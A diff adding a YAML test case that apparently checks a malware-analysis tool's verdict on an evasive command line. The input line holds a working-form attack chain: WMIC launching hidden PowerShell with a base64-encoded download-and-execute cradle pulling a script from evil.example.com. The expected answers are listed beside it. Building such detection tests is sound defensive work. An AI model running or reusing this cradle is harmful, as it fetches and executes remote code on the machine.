@@ -1,0 +1,30 @@
+id: T09_wmic_encodedcommand_cradle
+title: Malicious — WMIC → PowerShell EncodedCommand → download cradle
+provenance: canonical evasion chain observed in Empire, Cobalt Strike shapes
+input: 'wmic process call create "powershell.exe -w Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHgALgBwAHMAMQAiACkA"'
+expected_verdict: malicious
+must_fire_intents:
+  - staging
+  - remote_execution
+  - runtime_dependent
+must_not_fire:
+  - credential_access
+forbidden_words_in_verdict:
+  - empire
+  - cobalt strike
+  - ransomware
+  - campaign
+must_admit_unknown: false
+expected_confidence_band: high
+expected_iocs:
+  - {kind: url, value: 'http://evil.example.com/x.ps1'}
+expected_mitre:
+  - T1105
+  - T1059.001
+expected_behaviors:
+  - staging
+  - remote source
+min_recommendations: 2
+notes: >
+  Multi-wrapper evasion. Tests the full IU → CRE → RTE → Intent
+  → Verdict chain.
